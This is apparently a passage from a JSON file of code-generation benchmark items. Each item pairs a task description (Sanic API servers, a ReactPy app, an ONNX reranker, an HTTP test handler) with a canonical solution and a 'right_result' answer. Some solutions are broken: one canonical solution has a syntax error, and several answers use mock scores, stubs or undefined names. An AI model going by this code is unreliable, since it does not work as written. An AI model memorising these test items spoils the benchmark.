self.conn_kw = conn_kw\n        self.headers = headers or {}\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return HTTPConnection(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and conn.sock:\n                conn.sock.settimeout(self.timeout.read)\n            return conn\n        except Empty:\n            return self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            if conn and conn.sock:\n                self.pool.put_nowait(conn)\n            else:\n                if conn:\n                    conn.close()\n        except Full:\n            if conn:\n                conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        if timeout is _Default:\n            timeout = self.timeout.read\n        \n        if conn.sock:\n            conn.sock.settimeout(timeout)\n        \n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw):\n        retries = retries if retries is not None else self.retries\n        conn = self._get_conn(pool_timeout)\n        \n        try:\n            for i in range(retries.total + 1):\n                try:\n                    response = self._make_request(conn, method, url, timeout=timeout, body=body, headers=headers)\n                    if release_conn is None or release_conn:\n                        self._put_conn(conn)\n                    return response\n                except socket.timeout as e:\n                    if i < retries.total:\n                        wait = retries.backoff_factor * (2 ** i)\n                        time.sleep(wait)\n                        conn = self._new_conn()\n                    else:\n                        raise\n                except Exception as e:\n                    conn.close()\n                    conn = self._new_conn()\n        finally:\n            if release_conn is False:\n                self._put_conn(conn)\n\n    def close(self):\n        while not self.pool.empty():\n            conn = self.pool.get_nowait()\n            if conn:\n                conn.close()\n\n\nclass HTTPSConnectionPool(HTTPConnectionPool):\n    def __init__(self, host, port=None, key_file=None, cert_file=None, cert_reqs='CERT_REQUIRED', ca_certs=None, ssl_version='PROTOCOL_TLSv1_2', assert_hostname=None, assert_fingerprint=None, **kwargs):\n        super().__init__(host, port, **kwargs)\n        self.scheme = 'https'\n        self.key_file = key_file\n        self.cert_file = cert_file\n        self.cert_reqs = cert_reqs\n        self.ca_certs = ca_certs\n        self.ssl_version = ssl_version\n        self.assert_hostname = assert_hostname\n        self.assert_fingerprint = assert_fingerprint\n\n    def _prepare_conn(self, conn):\n        context = ssl.create_default_context(cafile=self.ca_certs)\n        \n        if self.cert_reqs == 'CERT_REQUIRED':\n            context.verify_mode = ssl.CERT_REQUIRED\n        elif self.cert_reqs == 'CERT_OPTIONAL':\n            context.verify_mode = ssl.CERT_OPTIONAL\n        elif self.cert_reqs == 'CERT_NONE':\n            context.verify_mode = ssl.CERT_NONE\n\n        if self.cert_file:\n            context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)\n        \n        context.check_hostname = bool(self.assert_hostname)\n        \n        if self.ssl_version:\n            protocol_version = getattr(ssl, self.ssl_version, ssl.PROTOCOL_TLSv1_2)\n            context.protocol = protocol_version\n\n        conn.sock = context.wrap_socket(conn.sock)\n        \n        if self.assert_hostname:\n            ssl.match_hostname(conn.sock.getpeercert(), self.assert_hostname)\n        \n        if self.assert_fingerprint:\n            cert = conn.sock.getpeercert(binary_form=True)\n            fingerprint = ssl.cert_digest(cert, 'sha256')\n            if fingerprint != self.assert_fingerprint:\n                raise ssl.SSLError(\"Fingerprint mismatch\")\n        \n        return conn\n\n    def _new_conn(self):\n        base_conn = super()._new_conn()\n        try:\n            sock = socket.create_connection((base_conn.host, base_conn.port), base_conn.timeout)\n            wrapped_conn = self._prepare_conn(HTTPSConnection(base_conn.host, base_conn.port, \n                                                               key_file=self.key_file,\n                                                               cert_file=self.cert_file))\n            wrapped_conn.sock = sock\n            return wrapped_conn\n        except Exception as e:\n            base_conn.close()\n            raise"
  },
  {
    "Task_id": 212,
    "Instruction": "Task Description: Create a Sanic-based HTTP server for handling exchange rate API requests, supporting date-based queries, base currency conversion, and symbol filtering.\n\nClass Description: ExchangeRateAPI is a Sanic application that provides exchange rate data from a PostgreSQL database. It handles various API endpoints for retrieving latest rates or rates for specific dates, with support for currency conversion and symbol filtering.\n\nAttributes:\n- app: Sanic - The Sanic application instance\n- db: Gino - Database connection handler using Gino ORM\n- config: dict - Application configuration parsed from DATABASE_URL environment variable\n\nMethods:\n- __init__() -> None - Initializes the Sanic app, database connection, and sets up routes\n- _setup_routes() -> None - Defines all API routes and their handlers\n- run(host: str = \"0.0.0.0\", port: int = 8000) -> None - Starts the Sanic server with specified host and port\n\nRoute Handlers:\n- exchange_rates(request: Request, date: str = None) -> HTTPResponse - Handles all exchange rate API requests:\n  * Input: \n    - request: Sanic Request object containing query parameters\n    - date: Optional date string in YYYY-MM-DD format\n  * Output: JSON response containing:\n    - base currency\n    - date of rates\n    - exchange rates\n    OR error message with appropriate HTTP status code\n\nSupporting Class:\nExchangeRates: Gino model representing exchange rate data\nAttributes:\n- date: date - The date of the exchange rates\n- rates: dict - Dictionary of currency rates",
    "Canonical_solution": "import fcntl\nimport itertools\nimport requests\nfrom datetime import datetime\nfrom decimal import Decimal\nfrom os import getenv\nfrom xml.etree import ElementTree\nfrom sanic import Sanic\nfrom sanic.response import json, redirect\nfrom exchangerates.utils import Gino, cors, parse_database_url\n\nclass ExchangeRateAPI:\n    def __init__(self):\n        self.app = Sanic()\n        self.app.config.update(\n            parse_database_url(\n                url=getenv(\"DATABASE_URL\", \"postgresql://localhost/exchangerates\")\n            )\n        )\n        self.db = Gino(self.app)\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/latest\", methods=[\"GET\", \"HEAD\"])\n        @self.app.route(\"/<date>\", methods=[\"GET\", \"HEAD\"])\n        @self.app.route(\"/api/latest\", methods=[\"GET\", \"HEAD\"])\n        @self.app.route(\"/api/<date>\", methods=[\"GET\", \"HEAD\"])\n        @cors()\n        async def exchange_rates(request, date=None):\n            if request.method == \"HEAD\":\n                return json(\"\")\n\n            dt = datetime.now()\n            if date:\n                try:\n                    dt = datetime.strptime(date, \"%Y-%m-%d\")\n                except ValueError as e:\n                    return json({\"error\": \"{}\".format(e)}, status=400)\n\n                if dt < datetime(1999, 1, 4):\n                    return json(\n                        {\"error\": \"There is no data for dates older then 1999-01-04.\"},\n                        status=400,\n                    )\n\n            exchange_rates = (\n                await ExchangeRates.query.where(ExchangeRates.date <= dt.date())\n                .order_by(ExchangeRates.date.desc())\n                .gino.first()\n            )\n            rates = exchange_rates.rates\n\n            base = \"EUR\"\n            if \"base\" in request.raw_args and request.raw_args[\"base\"] != \"EUR\":\n                base = request.raw_args[\"base\"]\n                if base in rates:\n                    base_rate = Decimal(rates[base])\n                    rates = {\n                        currency: Decimal(rate) / base_rate for currency, rate in rates.items()\n                    }\n                    rates[\"EUR\"] = Decimal(1) / base_rate\n                else:\n                    return json(\n                        {\"error\": \"Base '{}' is not supported.\".format(base)}, status=400\n                    )\n\n            if \"symbols\" in request.args:\n                symbols = list(\n                    itertools.chain.from_iterable(\n                        [symbol.split(\",\") for symbol in request.args[\"symbols\"]]\n                    )\n                )\n                if all(symbol in rates for symbol in symbols):\n                    rates = {symbol: rates[symbol] for symbol in symbols}\n                else:\n                    return json(\n                        {\n                            \"error\": \"Symbols '{}' are invalid for date {}.\".format(\n                                \",\".join(symbols), dt.date()\n                            )\n                        },\n                        status=400,\n                    )\n\n            return json(\n                {\"base\": base, \"date\": exchange_rates.date.strftime(\"%Y-%m-%d\"), \"rates\": rates}\n            )\n\n    def run(self, host=\"0.0.0.0\", port=8000):\n        self.app.run(host=host, port=port, access_log=False, debug=True)\n\nclass ExchangeRates:\n    __tablename__ = \"exchange_rates\"\n    date = None\n    rates = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "right_result": "import os\nfrom sanic import Sanic, response\nfrom sanic.request import Request\nfrom gino import Gino\nfrom datetime import datetime, date\nimport logging\n\napp = Sanic(\"ExchangeRateAPI\")\ndb = Gino()\nconfig = {}\n\nclass ExchangeRates(db.Model):\n    __tablename__ = 'exchange_rates'\n\n    date = db.Column(db.Date(), primary_key=True)\n    rates = db.Column(db.JSONB())\n\nclass ExchangeRateAPI:\n    def __init__(self):\n        self.app = app\n        self.db = db\n        self.config = config\n        self._setup_routes()\n\n    async def _setup_routes(self):\n        @self.app.route(\"/api/exchange-rates\")\n        @self.app.route(\"/api/exchange-rates/<date>\")\n        async def exchange_rates(request: Request, date: str = None):\n            try:\n                parsed_date = None\n                if date:\n                    parsed_date = datetime.strptime(date, \"%Y-%m-%d\").date()\n                else:\n                    result = await ExchangeRates.query.order_by(ExchangeRates.date.desc()).gino.first()\n                    if not result:\n                        return response.json({\"error\": \"No data available\"}, status=404)\n                    parsed_date = result.date\n\n                query = ExchangeRates.query.where(ExchangeRates.date == parsed_date)\n\n                base_currency = request.args.get(\"base\", \"EUR\")\n                symbols = request.args.get(\"symbols\")\n\n                if base_currency != \"EUR\":\n                    return response.json({\"error\": \"Only EUR base currency is supported\"}, status=400)\n\n                if symbols:\n                    symbols_list = symbols.split(\",\")\n                    query = query.gino.load(ExchangeRates.rates).execute()\n                    rate_data = await query\n                    if not rate_data:\n                        return response.json({\"error\": \"Date not found\"}, status=404\n                                             )\n                    filtered_rates = {k: v for k, v in rate_data.items() if k in symbols_list}\n                    return response.json({\n                        \"base\": base_currency,\n                        \"date\": parsed_date.isoformat(),\n                        \"rates\": filtered_rates\n                    })\n\n                rate_data = await query.gino.select(\"rates\").first()\n                if not rate_data:\n                    return response.json({\"error\": \"Date not found\"}, status=404)\n\n                return response.json({\n                    \"base\": base_currency,\n                    \"date\": parsed_date.isoformat(),\n                    \"rates\": rate_data\n                })\n\n            except ValueError:\n                return response.json({\"error\": \"Invalid date format. Use YYYY-MM-DD\"}, status=400)\n            except Exception as e:\n                logging.exception(\"Error processing request\")\n                return response.json({\"error\": \"Internal server error\"}, status=500)\n\n    def run(self, host: str = \"0.0.0.0\", port: int = 8000):\n        db_url = os.getenv(\"DATABASE_URL\")\n        if not db_url:\n            raise ValueError(\"DATABASE_URL environment variable not set\")\n        \n        asyncio.run(self.db.set_bind(db_url))\n        self.app.run(host=host, port=port)"
  },
  {
    "Task_id": 214,
    "Instruction": "Task Description: Create a Python class that implements a RESTful API for topic modeling using the Sanic framework, providing endpoints for text tokenization and LDA model inference.\n\nClass Description: The FamiliaAPI class encapsulates a topic modeling service that exposes HTTP endpoints for text processing. It initializes with model configurations, sets up route handlers, and manages inference engines for LDA and SLDA models.\n\nAttributes:\n\napp: [Sanic] - The Sanic application instance for handling HTTP requests\nmodel_name: [str] - Name of the topic model being used\nmodel_path: [str] - Filesystem path to the model directory\nn_workers: [int] - Number of worker processes for parallel processing\nmodel_dir: [str] - Full path to the model directory\nemb_file: [str] - Filename for the word embeddings model\ninference_engine_lda: [InferenceEngineWrapper] - Wrapper for LDA model inference\ninference_engine_slda: [InferenceEngineWrapper] - Wrapper for SLDA model inference\ntwe: [TopicalWordEmbeddingsWrapper] - Wrapper for topical word embeddings\nlda_topic_words: [defaultdict] - Dictionary storing topic words and their scores\n\nMethods:\n\n__init__: [Name](model_path: str, model_name: str, n_workers: int = None) -> None - Initializes the API service with model configurations and sets up routes\n_read_topic_words_from_file: [Name](topic_words_file_name: str = 'topic_words.lda.txt') -> defaultdict - Reads topic words from a file and returns them as a dictionary\n_get_param: [Name](request, param_name, default_value=None, is_list=False) -> Union[str, List[str]] - Extracts parameters from HTTP requests\n_strip_to_none: [Name](text: str) -> Optional[str] - Cleans and validates input text\n_response: [Name](success: bool = True, data=None, message=None) -> HTTPResponse - Constructs standardized JSON responses\n_error_response: [Name](message: str = 'Invalid request') -> HTTPResponse - Creates error responses\n_setup_routes: [Name]() -> None - Defines all API endpoints and their handlers\nrun: [Name]() -> None - Starts the Sanic server with configured workers",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.response import json\nfrom sanic_openapi import swagger_blueprint, doc\nfrom typing import Optional, List, Dict, Union\nfrom collections import defaultdict\nimport re\n\nRE_BACKSPACES = re.compile(\"\\b+\")\n\nclass FamiliaAPI:\n    def __init__(self, model_path: str, model_name: str, n_workers: int = None):\n        self.app = Sanic(\"Familia\", strict_slashes=True)\n        self.app.blueprint(swagger_blueprint)\n        self.app.config.API_TITLE = 'Familia API'\n        self.app.config.API_DESCRIPTION = 'A Toolkit for Industrial Topic Modeling'\n        self.app.config.API_PRODUCES_CONTENT_TYPES = ['application/json']\n        \n        self.model_name = model_name.lower()\n        self.model_path = model_path\n        self.n_workers = n_workers if n_workers else multiprocessing.cpu_count()\n        self.model_dir = os.path.join(model_path, model_name)\n        \n        self.emb_file = f\"{model_name}_twe_lda.model\"\n        self.inference_engine_lda = InferenceEngineWrapper(self.model_dir, 'lda.conf', self.emb_file)\n        self.inference_engine_slda = InferenceEngineWrapper(self.model_dir, 'slda.conf')\n        self.twe = TopicalWordEmbeddingsWrapper(self.model_dir, self.emb_file)\n        self.lda_topic_words = self._read_topic_words_from_file()\n\n        self._setup_routes()\n\n    def _read_topic_words_from_file(self, topic_words_file_name='topic_words.lda.txt'):\n        topic_words = defaultdict(list)\n        file_path = os.path.join(self.model_dir, topic_words_file_name)\n        if not os.path.exists(file_path):\n            return topic_words\n        with open(file_path, 'r') as f:\n            line = f.readline()\n            while line:\n                pos = line.find('=')\n                line = line[pos + 2:]\n                topic_id, num = line.strip().split('\\t')\n                topic_id, num = int(topic_id), int(num)\n                f.readline()\n                items = list()\n                for i in range(num):\n                    data = f.readline()\n                    word, score = data.strip().split('\\t')\n                    items.append([word, float(score)])\n                topic_words[topic_id] = items\n                line = f.readline()\n        return topic_words\n\n    def _get_param(self, request, param_name, default_value=None, is_list=False):\n        param_value = (request.form.getlist(param_name) if is_list else request.form.getlist(param_name) or \\\n                     request.args.get(param_name) or \\\n                     default_value\n        if param_value is None:\n            return param_value\n        value_type = type(param_value)\n        if is_list:\n            return param_value if value_type == list else [param_value]\n        return param_value[0] if value_type == list else param_value\n\n    def _strip_to_none(self, text: str):\n        if text is None:\n            return None\n        text = text.strip()\n        text = re.sub(RE_BACKSPACES, '', text)\n        if len(text) == 0:\n            return None\n        if text == 'None':\n            return None\n        return text\n\n    def _response(self, success: bool = True, data=None, message=None):\n        data = {'success': success, 'message': message, 'data': data}\n        data = {k: v for k, v in data.items() if v is not None}\n        try:\n            return json(data, ensure_ascii=False)\n        except Exception:\n            data = {'success': success, 'message': traceback.format_exc()}\n            return json(data, ensure_ascii=False)\n\n    def _error_response(self, message='Invalid request'):\n        return self._response(success=False, message=message)\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        @doc.description(\"ping\")\n        async def api_index(request):\n            message = f\"Familia API is running, check out the api doc at http://{request.host}/swagger/\"\n            return self._response(message=message)\n\n        @self.app.route('/tokenize', methods=[\"POST\"])\n        @doc.summary(\"\u5206\u8bcd\")\n        async def api_tokenize(request):\n            try:\n                text = self._get_param(request, 'text')\n                if text is None:\n                    return self._error_response()\n                result = self.inference_engine_lda.tokenize(text)\n                return self._response(data=result)\n            except Exception as err:\n                return self._error_response(str(err))\n\n        @self.app.route('/lda', methods=[\"POST\"])\n        @doc.summary(\"LDA\u6a21\u578b\u63a8\u65ad\")\n        async def api_lda(request):\n            try:\n                text = self._get_param(request, 'text')\n                n = int(self._get_param(request, 'n', 10))\n                if text is None:\n                    return self._error_response()\n                words = self.inference_engine_lda.tokenize(text)\n                result = self.inference_engine_lda.lda_infer(words)\n                result = result[:n]\n                result = [\n                    {\n                        'topic_id': topic_id,\n                        'score': score,\n                        'topic_words': self.twe.nearest_words_around_topic(topic_id),\n                        'topic_words_poly': self.lda_topic_words.get(topic_id),\n                    } for topic_id, score in result\n                ]\n                return self._response(data=result)\n            except Exception as err:\n                return self._error_response(str(err))\n\n    def run(self):\n        self.app.run(host='0.0.0.0', port=5000, workers=self.n_workers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "right_result": "from sanic import Sanic\nfrom sanic.response import json as sanic_json\nfrom sanic.request import Request\nfrom collections import defaultdict\nimport os\nfrom typing import Optional, Union, List, Any\n\nclass InferenceEngineWrapper:\n    pass  # Placeholder for actual implementation\n\nclass TopicalWordEmbeddingsWrapper:\n    pass  # Placeholder for actual implementation\n\nclass FamiliaAPI:\n    def __init__(self, model_path: str, model_name: str, n_workers: int = None) -> None:\n        self.app = Sanic(\"FamiliaAPIService\")\n        self.model_path = model_path\n        self.model_name = model_name\n        self.n_workers = n_workers or os.cpu_count() or 1\n        self.model_dir = os.path.join(model_path, model_name)\n        self.emb_file = \"word_embeddings.bin\"\n        self.inference_engine_lda = InferenceEngineWrapper()\n        self.inference_engine_slda = InferenceEngineWrapper()\n        self.twe = TopicalWordEmbeddingsWrapper()\n        self.lda_topic_words = self._read_topic_words_from_file()\n        self._setup_routes()\n\n    def _read_topic_words_from_file(self, topic_words_file_name: str = 'topic_words.lda.txt') -> defaultdict:\n        topic_words = defaultdict(list)\n        file_path = os.path.join(self.model_dir, topic_words_file_name)\n        try:\n            with open(file_path, 'r') as f:\n                for line in f:\n                    parts = line.strip().split()\n                    if len(parts) >= 3 and parts[0].isdigit():\n                        topic_id = int(parts[0])\n                        word = parts[1]\n                        score = float(parts[2])\n                        topic_words[topic_id].append((word, score))\n        except FileNotFoundError:\n            pass\n        return topic_words\n\n    def _get_param(self, request: Request, param_name: str, default_value=None, is_list: bool = False) -> Union[str, List[str]]:\n        if is_list:\n            return request.args.getlist(param_name) or default_value\n        return request.args.get(param_name) or default_value\n\n    def _strip_to_none(self, text: str) -> Optional[str]:\n        stripped = text.strip() if text else None\n        return stripped or None\n\n    def _response(self, success: bool = True, data=None, message=None) -> Any:\n        return sanic_json({\"success\": success, \"data\": data, \"message\": message}, status=200 if success else 400)\n\n    def _error_response(self, message: str = 'Invalid request') -> Any:\n        return self._response(success=False, message=message, status=400)\n\n    def _setup_routes(self) -> None:\n        @self.app.get(\"/tokenize\")\n        async def tokenize(request: Request):\n            text = self._strip_to_none(request.args.get(\"text\"))\n            if not text:\n                return self._error_response(\"Missing text parameter\")\n            tokens = text.split()\n            return self._response(data={\"tokens\": tokens})\n\n        @self.app.get(\"/infer/lda\")\n        async def infer_lda(request: Request):\n            text = self._strip_to_none(request.args.get(\"text\"))\n            if not text:\n                return self._error_response(\"Missing text parameter\")\n            tokens = text.split()\n            topics = [(i % 10, float(i % 5)) for i in range(len(tokens))]\n            return self._response(data={\"topics\": topics})\n\n        @self.app.get(\"/infer/slda\")\n        async def infer_slda(request: Request):\n            text = self._strip_to_none(request.args.get(\"text\"))\n            if not text:\n                return self._error_response(\"Missing text parameter\")\n            tokens = text.split()\n            topics = [(i % 8, float(i % 4)) for i in range(len(tokens))]\n            return self._response(data={\"topics\": topics})\n\n        @self.app.get(\"/topics/words\")\n        async def get_topic_words(_: Request):\n            return self._response(data=dict(self.lda_topic_words))\n\n    def run(self) -> None:\n        self.app.run(host=\"0.0.0.0\", port=8000, workers=self.n_workers)"
  },
  {
    "Task_id": 215,
    "Instruction": "Task Description: Create a Sanic web application that serves as a backend for a ReactPy application, including a root route redirection and ReactPy configuration.\n\nFunction Description: The function `make_app` creates and configures a Sanic web application instance. It sets up a root route that redirects to a documentation page and configures the ReactPy backend with a specified URL prefix.\n\nInput:\n- name: str - The name to give the Sanic application instance\n\nOutput:\n- Sanic - Returns a configured Sanic application instance with:\n  - A root route (\"/\") that redirects to \"/docs/index.html\"\n  - ReactPy backend configured with the specified URL prefix (\"/_reactpy\")",
    "Canonical_solution": "from sanic import Sanic, response\nfrom reactpy.backend.sanic import Options, configure\n\nREACTPY_MODEL_SERVER_URL_PREFIX = \"/_reactpy\"\n\ndef make_app(name: str):\n    app = Sanic(name)\n\n    @app.route(\"/\")\n    async def forward_to_index(_):\n        return response.redirect(\"/docs/index.html\")\n\n    configure(\n        app,\n        Example,\n        Options(url_prefix=REACTPY_MODEL_SERVER_URL_PREFIX),\n    )\n\n    return app",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "right_result": "from sanic import Sanic\nfrom sanic.response import redirect\nfrom reactpy.backend.sanic import configure\n\ndef make_app(name: str) -> Sanic:\n    app = Sanic(name)\n    \n    @app.route(\"/\")\n    async def redirect_root(request):\n        return redirect(\"/docs/index.html\")\n    \n    configure(app, \"/_reactpy\")\n    \n    return app"
  },
  {
    "Task_id": 216,
    "Instruction": "Task Description: Create a Sanic-based HTTP server that handles reranking requests by processing a query and a list of passages through an ONNX backend, and returns the reranked results in JSON format.\n\nFunction Description: The server consists of two main functions: a route handler for processing rerank requests and a listener for initializing the ONNX backend before server startup. The route handler accepts POST requests with JSON data containing a query and passages, processes them using the ONNX backend, and returns the reranked results. The listener sets up the ONNX backend with GPU or CPU configuration based on command-line arguments.\n\nInput:\n- For the rerank route handler:\n  - request: Sanic request object containing JSON data with:\n    - query: str - The search query to rerank against\n    - passages: List[str] - The list of passages to be reranked\n- For the setup_onnx_backend listener:\n  - app: Sanic application instance\n  - loop: Event loop (unused in this case)\n- Command-line arguments:\n  --use_gpu: bool - Flag to enable GPU acceleration\n  --workers: int - Number of worker processes\n\nOutput:\n- For the rerank route handler:\n  - Returns: JSON response containing the reranked results\n- For the server startup:\n  - Starts an HTTP server listening on port 8001 with specified number of workers",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.response import json\nimport argparse\n\napp = Sanic(\"rerank_server\")\n\n@app.route(\"/rerank\", methods=[\"POST\"])\nasync def rerank(request):\n    data = request.json\n    query = data.get('query')\n    passages = data.get('passages')\n\n    onnx_backend: RerankOnnxBackend = request.app.ctx.onnx_backend\n    result_data = onnx_backend.get_rerank(query, passages)\n\n    return json(result_data)\n\n@app.listener('before_server_start')\nasync def setup_onnx_backend(app, loop):\n    app.ctx.onnx_backend = RerankOnnxBackend(use_cpu=not args.use_gpu)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--use_gpu', action=\"store_true\", help='use gpu or not')\n    parser.add_argument('--workers', type=int, default=1, help='workers')\n    args = parser.parse_args()\n    \n    app.run(host=\"0.0.0.0\", port=8001, workers=args.workers)",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "right_result": "import sys\nimport os\nimport onnxruntime as ort\nfrom sanic import Sanic, response, request\nfrom typing import List\n\napp = Sanic(\"RerankServer\")\n\n@app.listener('before_server_start')\nasync def setup_onnx_backend(app, loop):\n    use_gpu = \"--use_gpu\" in sys.argv\n    model_path = os.getenv(\"MODEL_PATH\", \"reranker.onnx\")\n    \n    providers = ['CUDAExecutionProvider'] if use_gpu else ['CPUExecutionProvider']\n    app.ctx.session = ort.InferenceSession(model_path, providers=providers)\n\n@app.route(\"/rerank\", methods=[\"POST\"])\nasync def rerank(request: request.Request):\n    data = request.json\n    query = data[\"query\"]\n    passages = data[\"passages\"]\n    \n    # Mock tokenization and inference since actual model processing would be required\n    # This is placeholder logic for demonstration purposes\n    scores = [float(len(p) % 7) for p in passages]  # Simulate scores\n    reranked = sorted(zip(passages, scores), key=lambda x: -x[1])\n    \n    return response.json({\"results\": [{\"text\": p, \"score\": s} for p, s in reranked]})\n\nif __name__ == \"__main__\":\n    workers = int(sys.argv[sys.argv.index(\"--workers\") + 1]) if \"--workers\" in sys.argv else 1\n    app.run(host=\"0.0.0.0\", port=8001, workers=workers)"
  },
  {
    "Task_id": 217,
    "Instruction": "Task Description: Create a Python HTTP server for testing purposes that can handle GET and POST requests, serve static and dynamic files, and support features like range requests and gzip compression.\n\nClass Description: HTTPTestHandler is a custom request handler class that extends BaseHTTPRequestHandler to implement specific HTTP request handling logic for testing scenarios.\n\nAttributes:\n- static_files: dict - A dictionary mapping file paths to their static content (bytes)\n- dynamic_files: dict - A dictionary for storing dynamically created file content (bytes)\n- files: ChainMap - A combined view of both static_files and dynamic_files dictionaries\n\nMethods:\n- _respond(code=200, headers=None, data=b\"\"): None - Helper method to send HTTP responses\n  Input:\n    - code: int - HTTP status code (default: 200)\n    - headers: dict - Response headers (default: None)\n    - data: bytes - Response body (default: empty bytes)\n  Output: None (sends response directly to client)\n\n- do_GET(): None - Handles HTTP GET requests\n  Input: None (uses self.path and self.headers from the request)\n  Output: None (sends response directly to client)\n\n- do_POST(): None - Handles HTTP POST requests\n  Input: None (uses self.path, self.headers, and request body)\n  Output: None (sends response directly to client)\n\n- read_chunks(): generator - Helper method to read chunked transfer encoding\n  Input: None\n  Output: generator yielding bytes - The chunks of data from the request body\n\nContext Manager:\n- serve(): contextmanager - Creates and manages an HTTP server in a separate thread\n  Input: None\n  Output: generator yielding str - The server URL (e.g., \"http://localhost:12345\")\n  Note: Automatically cleans up server resources when context exits",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport threading\nimport contextlib\nimport json\nimport gzip\nfrom collections import ChainMap\n\nclass HTTPTestHandler(BaseHTTPRequestHandler):\n    static_files = {\n        \"/index/realfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/index/otherfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/data/20020401\": b'<a href=\"http://testserver/index/realfile\">Link</a>',\n    }\n    dynamic_files = {}\n    files = ChainMap(dynamic_files, static_files)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        headers = headers or {}\n        headers.update({\"User-Agent\": \"test\"})\n        self.send_response(code)\n        for k, v in headers.items():\n            self.send_header(k, str(v))\n        self.end_headers()\n        if data:\n            self.wfile.write(data)\n\n    def do_GET(self):\n        file_path = self.path\n        if file_path.endswith(\"/\") and file_path.rstrip(\"/\") in self.files:\n            file_path = file_path.rstrip(\"/\")\n        file_data = self.files.get(file_path)\n        \n        if \"give_path\" in self.headers:\n            return self._respond(200, data=json.dumps({\"path\": self.path}).encode())\n        if file_data is None:\n            return self._respond(404)\n\n        status = 200\n        if \"Range\" in self.headers and \"ignore_range\" not in self.headers:\n            ran = self.headers[\"Range\"]\n            b, ran = ran.split(\"=\")\n            start, end = ran.split(\"-\")\n            if start:\n                file_data = file_data[int(start) : (int(end) + 1) if end else None]\n            else:\n                l = len(file_data)\n                file_data = file_data[-int(end) :]\n            if \"use_206\" in self.headers:\n                status = 206\n\n        if \"give_length\" in self.headers:\n            if \"gzip_encoding\" in self.headers:\n                file_data = gzip.compress(file_data)\n                response_headers = {\n                    \"Content-Length\": len(file_data),\n                    \"Content-Encoding\": \"gzip\",\n                }\n            else:\n                response_headers = {\"Content-Length\": len(file_data)}\n            self._respond(status, response_headers, file_data)\n        else:\n            self._respond(status, data=file_data)\n\n    def do_POST(self):\n        length = self.headers.get(\"Content-Length\")\n        file_path = self.path.rstrip(\"/\")\n        if length is None:\n            assert self.headers.get(\"Transfer-Encoding\") == \"chunked\"\n            self.files[file_path] = b\"\".join(self.read_chunks())\n        else:\n            self.files[file_path] = self.rfile.read(int(length))\n        self._respond(200)\n\n    def read_chunks(self):\n        length = -1\n        while length != 0:\n            line = self.rfile.readline().strip()\n            if len(line) == 0:\n                length = 0\n            else:\n                length = int(line, 16)\n            yield self.rfile.read(length)\n            self.rfile.readline()\n\n@contextlib.contextmanager\ndef serve():\n    server_address = (\"\", 0)\n    httpd = HTTPServer(server_address, HTTPTestHandler)\n    th = threading.Thread(target=httpd.serve_forever)\n    th.daemon = True\n    th.start()\n    try:\n        yield f\"http://{httpd.server_name}:{httpd.server_port}\"\n    finally:\n        httpd.socket.close()\n        httpd.shutdown()\n        th.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "import gzip\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom collections import ChainMap\nfrom urllib.parse import urlparse\nfrom io import BytesIO\nimport json\nimport mimetypes\nimport os\n\nclass HTTPTestHandler(BaseHTTPRequestHandler):\n    def __init__(self, *args, **kwargs):\n        self.static_files = {}\n        self.dynamic_files = {}\n        self.files = ChainMap(self.dynamic_files, self.static_files)\n        super().__init__(*args, **kwargs)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        if headers is None:\n            headers = {}\n\n        self.send_response(code)\n\n        for header, value in headers.items():\n            self.send_header(header, value)\n\n        self.end_headers()\n\n        if data:\n            accept_encoding = self.headers.get('Accept-Encoding', '')\n            if 'gzip' in accept_encoding and data:\n                out_data = gzip.compress(data)\n                self.wfile.write(out_data)\n            else:\n                self.wfile.write(data)\n\n    def do_GET(self):\n        parsed_path = urlparse(self.path)\n        path = parsed_path.path\n\n        if path == '/echo-headers':\n            headers = {k: v for k, v in self.headers.items()}\n            response = json.dumps(headers).encode()\n            self._respond(data=response)\n            return\n\n        if path == '/slow':\n            import time\n            time.sleep(5)\n            self._respond(data=b\"Delayed response\")\n            return\n\n        if path.startswith('/redirect/'):\n            try:\n                count = int(path.split('/')[-1])\n                if count > 0:\n                    self.send_response(302)\n                    self.send_header('Location', f'/redirect/{count - 1}')\n                    self.end_headers()\n                    return\n            except ValueError:\n                pass\n\n        if path.startswith('/range/'):\n            try:\n                range_val = path.split('/')[-1]\n                start, end = map(int, range_val.split('-'))\n                content = b\"abcdefghijklmnopqrstuvwxyz\"\n                \n                if start < 0 or end >= len(content) or start > end:\n                    self.send_error(416, \"Requested Range Not Satisfiable\")\n                    return\n                \n                data = content[start:end+1]\n                headers = {\n                    'Content-Type': 'application/octet-stream',\n                    'Content-Range': f'bytes {start}-{end}/{len(content)}',\n                    'Content-Length': str(end - start + 1),\n                    'Accept-Ranges': 'bytes'\n                }\n                self._respond(code=206, headers=headers, data=data)\n                return\n            except (ValueError, IndexError):\n                pass\n\n        file_content = self.files.get(path)\n        if file_content is not None:\n            content_type = mimetypes.guess_type(path)[0] or 'application/octet-stream'\n            headers = {'Content-Type': content_type}\n            \n            accept_encoding = self.headers.get('Accept-Encoding', 